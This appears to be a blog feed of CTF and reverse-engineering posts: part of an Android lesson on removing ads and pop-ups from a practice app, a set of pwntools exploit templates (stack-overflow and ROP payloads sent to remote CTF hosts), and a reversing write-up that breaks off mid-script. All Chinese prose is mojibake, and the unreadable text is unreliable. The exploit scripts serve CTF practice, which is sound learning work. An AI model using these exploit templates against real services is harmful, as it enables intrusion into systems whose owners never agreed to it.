title="å¯„å­˜å™¨(ä½ è¦æ˜¯ä¼šç”¨idaæˆ–è€…çœ‹è¿‡æ±‡ç¼–å°±å¾ˆå®¹æ˜“æ˜ç™½)"></a>å¯„å­˜å™¨(ä½ è¦æ˜¯ä¼šç”¨idaæˆ–è€…çœ‹è¿‡æ±‡ç¼–å°±å¾ˆå®¹æ˜“æ˜ç™½)</h4><p>smalié‡Œçš„æ‰€æœ‰æ“ä½œéƒ½å¿…é¡»ç»è¿‡å¯„å­˜å™¨æ¥è¿›è¡Œ:æœ¬åœ°å¯„å­˜å™¨ç”¨vå¼€å¤´æ•°å­—ç»“å°¾çš„ç¬¦å·æ¥è¡¨ç¤ºï¼Œå¦‚v0ã€ v1ã€v2ã€‚ å‚æ•°å¯„å­˜å™¨åˆ™ä½¿ç”¨på¼€å¤´æ•°å­—ç»“å°¾çš„ç¬¦å·æ¥è¡¨ç¤ºï¼Œå¦‚p0ã€p1ã€p2ã€‚ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œp0ä¸ä¸€å®šæ˜¯å‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œåœ¨éstaticå‡½æ•°ä¸­ï¼Œp0ä»£æŒ‡â€œthisâ€ï¼Œp1è¡¨ç¤ºå‡½æ•°çš„ç¬¬ä¸€ä¸ª å‚æ•°ï¼Œp2ä»£è¡¨å‡½æ•°ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚è€Œåœ¨staticå‡½æ•°ä¸­p0æ‰å¯¹åº”ç¬¬ä¸€ä¸ªå‚æ•°(å› ä¸ºJavaçš„staticæ–¹æ³•ä¸­æ²¡æœ‰thisæ–¹æ³•ï¼‰</p><hr><hr><h3 id="4-æ­å–œä½ è·å¾—å¹¿å‘Š-å¼¹çª—é™é»˜å¡"><a href="#4-æ­å–œä½ è·å¾—å¹¿å‘Š-å¼¹çª—é™é»˜å¡" class="headerlink" title="4.æ­å–œä½ è·å¾—å¹¿å‘Š&amp;å¼¹çª—é™é»˜å¡"></a>4.æ­å–œä½ è·å¾—å¹¿å‘Š&amp;å¼¹çª—é™é»˜å¡</h3><h4 id="1-å¹¿å‘Šç±»å‹"><a href="#1-å¹¿å‘Šç±»å‹" class="headerlink" title="1.å¹¿å‘Šç±»å‹"></a>1.å¹¿å‘Šç±»å‹</h4><p>å¯åŠ¨å¹¿å‘Š   å¼¹çª—&amp;æ›´æ–°å¹¿å‘Š  æ¨ªå¹…å¹¿å‘Š</p><h4 id="2-å®‰å“å››å¤§ç»„ä»¶"><a href="#2-å®‰å“å››å¤§ç»„ä»¶" class="headerlink" title="2.å®‰å“å››å¤§ç»„ä»¶"></a>2.å®‰å“å››å¤§ç»„ä»¶</h4><table><thead><tr><th align="left">ç»„ä»¶</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">Activity(æ´»åŠ¨)</td><td align="left">åœ¨åº”ç”¨ä¸­çš„ä¸€ä¸ªActivityå¯ä»¥ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç•Œé¢ï¼Œæ„æ€å¯ä»¥ç†è§£ä¸ºâ€œæ´»åŠ¨â€ï¼Œå³ä¸€ä¸ªæ´»åŠ¨å¼€å§‹ï¼Œä»£è¡¨ Activityç»„ä»¶å¯åŠ¨ï¼Œæ´»åŠ¨ç»“æŸï¼Œä»£è¡¨ä¸€ä¸ªActivityçš„ç”Ÿå‘½å‘¨æœŸç»“æŸã€‚ä¸€ä¸ªAndroidåº”ç”¨å¿…é¡»é€šè¿‡Activityæ¥è¿è¡Œå’Œå¯åŠ¨ï¼ŒActivityçš„ç”Ÿå‘½å‘¨æœŸäº¤ç»™ç³»ç»Ÿç»Ÿä¸€ç®¡ç†ã€‚</td></tr><tr><td align="left">Service(æœåŠ¡)</td><td align="left">Serviceå®ƒå¯ä»¥åœ¨åå°æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œæ“ä½œè€Œæ²¡æœ‰ç”¨æˆ·ç•Œé¢çš„åº”ç”¨ç»„ä»¶ï¼Œä¸ä¾èµ–ä»»ä½•ç”¨æˆ·ç•Œé¢ï¼Œä¾‹å¦‚åå°æ’­æ”¾éŸ³ä¹ï¼Œåå°ä¸‹è½½æ–‡ä»¶ç­‰ã€‚</td></tr><tr><td align="left">Broadcast Receiver(å¹¿æ’­æ¥æ”¶å™¨)</td><td align="left">ä¸€ä¸ªç”¨äºæ¥æ”¶å¹¿æ’­ä¿¡æ¯ï¼Œå¹¶åšå‡ºå¯¹åº”å¤„ç†çš„ç»„ä»¶ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„ç³»ç»Ÿå¹¿æ’­ï¼šé€šçŸ¥æ—¶åŒºæ”¹å˜ã€ç”µé‡ä½ã€ç”¨æˆ·æ”¹å˜äº†è¯­è¨€é€‰é¡¹ç­‰ã€‚</td></tr><tr><td align="left">Content Provider(å†…å®¹æä¾›è€…)</td><td align="left">ä½œä¸ºåº”ç”¨ç¨‹åºä¹‹é—´å”¯ä¸€çš„å…±äº«æ•°æ®çš„é€”å¾„ï¼ŒContent Providerä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å­˜å‚¨å¹¶æ£€ç´¢æ•°æ®ä»¥åŠå‘å…¶ä»–åº”ç”¨ç¨‹åºæä¾›è®¿é—®æ•°æ®çš„æ¥å£ã€‚Androidå†…ç½®çš„è®¸å¤šæ•°æ®éƒ½æ˜¯ä½¿ç”¨Content Providerå½¢å¼ï¼Œä¾›å¼€å‘è€…è°ƒç”¨çš„ï¼ˆå¦‚è§†é¢‘ï¼ŒéŸ³é¢‘ï¼Œå›¾ç‰‡ï¼Œé€šè®¯å½•ç­‰ï¼‰</td></tr></tbody></table><h5 id="1-activityçš„åˆ‡æ¢"><a href="#1-activityçš„åˆ‡æ¢" class="headerlink" title="1.activityçš„åˆ‡æ¢"></a>1.activityçš„åˆ‡æ¢</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!---å£°æ˜å®ç°åº”ç”¨éƒ¨åˆ†å¯è§†åŒ–ç•Œé¢çš„ Activityï¼Œå¿…é¡»ä½¿ç”¨ AndroidManifest ä¸­çš„ &lt;activity&gt; å…ƒç´ è¡¨ç¤ºæ‰€æœ‰ Activityã€‚ç³»ç»Ÿä¸ä¼šè¯†åˆ«å’Œè¿è¡Œä»»ä½•æœªè¿›è¡Œå£°æ˜çš„Activityã€‚-----&gt;</span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:label=<span class="string">&quot;@string/app_name&quot;</span>  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span>&gt;  &lt;!--å½“å‰Activityæ˜¯å¦å¯ä»¥è¢«å¦ä¸€ä¸ªApplicationçš„ç»„ä»¶å¯åŠ¨ï¼š<span class="literal">true</span>å…è®¸è¢«å¯åŠ¨ï¼›<span class="literal">false</span>ä¸å…è®¸è¢«å¯åŠ¨--&gt;</span><br><span class="line">           &lt;!---æŒ‡æ˜è¿™ä¸ªactivityå¯ä»¥ä»¥ä»€ä¹ˆæ ·çš„æ„å›¾(intent)å¯åŠ¨---&gt;</span><br><span class="line">           &lt;intent-filter&gt;  </span><br><span class="line">               &lt;!--è¡¨ç¤ºactivityä½œä¸ºä¸€ä¸ªä»€ä¹ˆåŠ¨ä½œå¯åŠ¨ï¼Œandroid.intent.action.MAINè¡¨ç¤ºä½œä¸ºä¸»activityå¯åŠ¨---&gt;</span><br><span class="line">               &lt;action  </span><br><span class="line">                   android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class="line">               &lt;!--è¿™æ˜¯actionå…ƒç´ çš„é¢å¤–ç±»åˆ«ä¿¡æ¯ï¼Œandroid.intent.category.LAUNCHERè¡¨ç¤ºè¿™ä¸ªactivityä¸ºå½“å‰åº”ç”¨ç¨‹åºä¼˜å…ˆçº§æœ€é«˜çš„Activity--&gt;</span><br><span class="line">               &lt;category  </span><br><span class="line">                   android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class="line">           &lt;/intent-filter&gt;  </span><br><span class="line">       &lt;/activity&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure><p>å¯åŠ¨å¹¿å‘Šæµç¨‹ï¼š<br>å¯åŠ¨Activity-&gt;å¹¿å‘ŠActivity-&gt;ä¸»é¡µActivity</p><p>ä¿®æ”¹æ–¹æ³•ï¼š<br>1.ä¿®æ”¹åŠ è½½æ—¶é—´<br>2.Acitivityåˆ‡æ¢å®šä½ï¼Œä¿®æ”¹Intentçš„Activityç±»å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (position) &#123;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class="line">               it.getContext().startActivity(intent);  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class="line">               it.getContext().startActivity(intent2);  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  <span class="comment">//newä¸€ä¸ªIntentï¼Œ</span></span><br><span class="line">               intent3.setClass(it.getContext(), AdActivity.class);  <span class="comment">//ä¼ å…¥è¦åˆ‡æ¢çš„Acitivityçš„ç±»å</span></span><br><span class="line">               it.getContext().startActivity(intent3);  <span class="comment">//å¯åŠ¨å¯¹åº”çš„Activity</span></span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class="line">               it.getContext().startActivity(intent4);  </span><br><span class="line">               <span class="keyword">return</span>; </span><br><span class="line">           <span class="keyword">default</span>:  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h4 id="3-Activityç”Ÿå‘½å‘¨æœŸ"><a href="#3-Activityç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3.Activityç”Ÿå‘½å‘¨æœŸ"></a>3.Activityç”Ÿå‘½å‘¨æœŸ</h4><table><thead><tr><th align="left">å‡½æ•°åç§°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">onCreate()</td><td align="left">ä¸€ä¸ªActivityå¯åŠ¨åç¬¬ä¸€ä¸ªè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œå¸¸ç”¨æ¥åœ¨æ­¤æ–¹æ³•ä¸­è¿›è¡ŒActivityçš„ä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ä¾‹å¦‚åˆ›å»ºViewï¼Œç»‘å®šæ•°æ®ï¼Œæ³¨å†Œç›‘å¬ï¼ŒåŠ è½½å‚æ•°ç­‰ã€‚</td></tr><tr><td align="left">onStart()</td><td align="left">å½“Activityæ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ—¶ï¼Œæ­¤æ–¹æ³•è¢«è°ƒç”¨ä½†æ­¤æ—¶è¿˜æ— æ³•è¿›è¡Œä¸ç”¨æˆ·çš„äº¤äº’æ“ä½œã€‚</td></tr><tr><td align="left">onResume()</td><td align="left">è¿™ä¸ªæ–¹æ³•åœ¨onStart()ä¹‹åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨Activityå‡†å¤‡å¥½ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„æ—¶å€™è°ƒç”¨ï¼Œæ­¤æ—¶çš„Activityä¸€å®šä½äºActivityæ ˆé¡¶ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€ã€‚</td></tr><tr><td align="left">onPause()</td><td align="left">è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ç³»ç»Ÿå‡†å¤‡å»å¯åŠ¨æˆ–è€…æ¢å¤å¦å¤–ä¸€ä¸ªActivityçš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸åœ¨è¿™ä¸ªæ–¹æ³•ä¸­æ‰§è¡Œä¸€äº›é‡Šæ”¾èµ„æºçš„æ–¹æ³•ï¼Œä»¥åŠä¿å­˜ä¸€äº›å…³é”®æ•°æ®ã€‚</td></tr><tr><td align="left">onStop()</td><td align="left">è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨Activityå®Œå…¨ä¸å¯è§çš„æ—¶å€™è°ƒç”¨çš„ã€‚</td></tr><tr><td align="left">onDestroy()</td><td align="left">è¿™ä¸ªæ–¹æ³•åœ¨Activityé”€æ¯ä¹‹å‰è°ƒç”¨ï¼Œä¹‹åActivityçš„çŠ¶æ€ä¸ºé”€æ¯çŠ¶æ€ã€‚</td></tr><tr><td align="left">onRestart()</td><td align="left">å½“Activityä»åœæ­¢stopçŠ¶æ€æ¢è¿›å…¥startçŠ¶æ€æ—¶è°ƒç”¨çŠ¶æ€ã€‚</td></tr></tbody></table><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="Activityç”Ÿå‘½å‘¨æœŸ"></p><h4 id="4-å¼¹çª—å®šä½-å †æ ˆåˆ†æ"><a href="#4-å¼¹çª—å®šä½-å †æ ˆåˆ†æ" class="headerlink" title="4.å¼¹çª—å®šä½&amp;å †æ ˆåˆ†æ"></a>4.å¼¹çª—å®šä½&amp;å †æ ˆåˆ†æ</h4><hr><p>ä¿®æ”¹æ–¹æ³•ï¼š<br>1.ä¿®æ”¹xmlä¸­çš„versiocode<br>2.Hookå¼¹çª—(æ¨èç®—æ³•åŠ©æ‰‹å¼€å¯å¼¹çª—å®šä½)<br>3.ä¿®æ”¹dexå¼¹çª—ä»£ç <br>4.æŠ“åŒ…ä¿®æ”¹å“åº”ä½“(ä¹Ÿå¯ä»¥è·¯ç”±å™¨æ‹¦æˆª)</p><h4 id="5-å¸ƒå±€ä¼˜åŒ–"><a href="#5-å¸ƒå±€ä¼˜åŒ–" class="headerlink" title="5.å¸ƒå±€ä¼˜åŒ–"></a>5.å¸ƒå±€ä¼˜åŒ–</h4><hr><p>1.å¼€å‘è€…åŠ©æ‰‹æŠ“å¸ƒå±€<br>2.MTç®¡ç†å™¨xmlæœç´¢å®šä½<br>3.ä¿®æ”¹xmlä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnå¸¸ç”¨è„šæœ¬æ¨¡æ¿</title>
      <link href="/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/"/>
      <url>/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-å¸¸ç”¨è„šæœ¬æ¨¡æ¿"><a href="#pwn-å¸¸ç”¨è„šæœ¬æ¨¡æ¿" class="headerlink" title="pwn å¸¸ç”¨è„šæœ¬æ¨¡æ¿"></a>pwn å¸¸ç”¨è„šæœ¬æ¨¡æ¿</h1><p>æ ˆæº¢å‡ºè„šæœ¬</p><p>ï¼ˆ32 ä½ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28181</span>)  <span class="comment">#åˆ›å»ºä¸€ä¸ªè¿œç¨‹è¿æ¥ï¼Œå°†ç¨‹åºä¸æŒ‡å®šçš„ä¸»æœºå’Œç«¯å£å»ºç«‹èµ·è”ç³»</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)    <span class="comment">#åœ°å€æ˜¯åé—¨å‡½æ•°æ‰€åœ¨çš„å‡½æ•°å¼€å§‹çš„åœ°å€</span></span><br><span class="line">p.sendline(payload)                         <span class="comment">#å°†æ„é€ å¥½çš„payloadå‘é€åˆ°è¿œç¨‹è¿æ¥çš„ç›®æ ‡ç«¯ç‚¹</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ï¼ˆ64 ä½ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25079</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ROP è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29267</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0400713</span></span><br><span class="line">bin_addr=<span class="number">0x00400734</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_addr)+p64(<span class="number">0x400616</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>bin_addr:æ˜¯ä½ è¦æ‰§è¡Œçš„æŒ‡ä»¤å­—ç¬¦ä¸²åœ°å€ï¼Œida å°±å¯ä»¥æŸ¥çœ‹ï¼ˆé€šå¸¸æ˜¯&#x2F;bin&#x2F;shï¼Œæˆ‘è¿™é¢˜æ˜¯æœ‰ç‚¹ç‰¹æ®Šï¼‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/bin_addr.png" alt="bin_addr"></p><p>pop _rdi éœ€è¦åœ¨ Ubuntu ä¸­æ‰§è¡Œä¸€ä¸ªæŒ‡ä»¤å¯»æ‰¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn1 --only &#x27;ret|pop&#x27;Gadgets information</span><br></pre></td></tr></table></figure><p>pwn1 æ›¿æ¢æˆç›¸åº”çš„æ–‡ä»¶åå­—</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/pop_rdi.png" alt="pop_rdi"></p><p>æœ€åçš„åœ°å€æ˜¯ system åœ¨å‡½æ•°ä¸­æ‰€åœ¨çš„åœ°å€</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/system.png" alt="system"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸</title>
      <link href="/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
      <url>/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸"><a href="#ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸" class="headerlink" title="ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸"></a>ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸</h1><hr><p>æ‰“äº†ä¸€ä¸‹cnssçš„æ–°ç”Ÿèµ›ï¼Œä¹Ÿæ˜¯å­¦åˆ°äº†ç‚¹æ–°ä¸œè¥¿</p><hr><h2 id="debugbreak"><a href="#debugbreak" class="headerlink" title="__debugbreak"></a>__debugbreak</h2><p>__debugbreakæ˜¯ä¸ª api å½“å‘ç”Ÿbugçš„æ—¶å€™è¦è¿›è¡Œè·³è½¬è¿›å…¥åˆ°å¤„ç†å‡½æ•°ï¼Œè¿™ä¸ªé¢˜çš„å…³é”®å°±åœ¨debugbreakçš„å¤„ç†å‡½æ•°ä¸­</p><hr><h2 id="ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸-1"><a href="#ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸-1" class="headerlink" title="ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸"></a>ã€cnssã€‘æ–°æ‰‹æ•™ç¨‹ï¼šæ–­ç‚¹å’Œå¼‚å¸¸</h2><p>å‡çš„flagéª—æˆ‘æ„Ÿæƒ…</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/fake_flag.png" alt="fake_flag"></p><p>æŸ¥çœ‹ä¼ªä»£ç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/main.png" alt="main"></p><hr><p>è·Ÿè¿›base64</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/base64.png" alt="base64"></p><p>å‘ç°è¿™æ ¹æœ¬ä¸æ˜¯base64å°±æ˜¯ä¸ªå¼‚æˆ–</p><p>ä½†æ˜¯è¦æ³¨æ„è¿™ä¸ªdebugbreakï¼Œå…ˆä¸‹ä¸ªæ–­ç‚¹</p><hr><p>åŠ¨è°ƒ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/%E5%8A%A8%E8%B0%83.png" alt="åŠ¨è°ƒ"></p><p>å‘ç°è·Ÿè¿›ä¸äº†debugbreakæ€ä¹ˆåŠå‘¢</p><hr><p>å…ˆè·Ÿè¿›ä¸Šé¢çš„keyï¼Œ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/key.png" alt="key"></p><hr><p>ç„¶åå†è·Ÿè¿›byte_40B0478</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/findsub.png" alt="findsub"></p><p>å‘ç°è·Ÿè¿›åˆ°çš„å¦ä¸€ä¸ªå‡½æ•°</p><hr><p>è¿™ä¸€å¤§ä¸²æ˜¯å°†çœŸæ­£çš„å¯†æ–‡è®¡ç®—ä¼ åˆ°cipher</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/enc.png" alt="enc"></p><hr><p>åˆ‡æ¢åˆ°æ±‡ç¼–ï¼Œæ³¨æ„è¿™é‡Œæœ‰ä¸¤ä¸ªåè°ƒè¯•</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/%E5%8F%8D%E8%B0%83%E8%AF%95.png" alt="åè°ƒè¯•"></p><p>è¿è¡Œå®Œåå°±ä¼šä¼ åˆ°cipherï¼Œç„¶åç»“åˆä¹‹å‰çš„keyå†™è„šæœ¬å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x05</span>, <span class="number">0x1E</span>, <span class="number">0x32</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>, <span class="number">0x0B</span>, <span class="number">0x12</span>, <span class="number">0x52</span>, <span class="number">0x6B</span>, <span class="number">0x45</span>, <span class="number">0x05</span>,</span><br><span class="line">  <span class="number">0x7A</span>, <span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0x0C</span>, <span class="number">0x70</span>, <span class="number">0x2E</span>, <span class="number">0x0B</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x2C</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x11</span>, <span class="number">0x79</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0x46</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x7E</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x6F</span>, <span 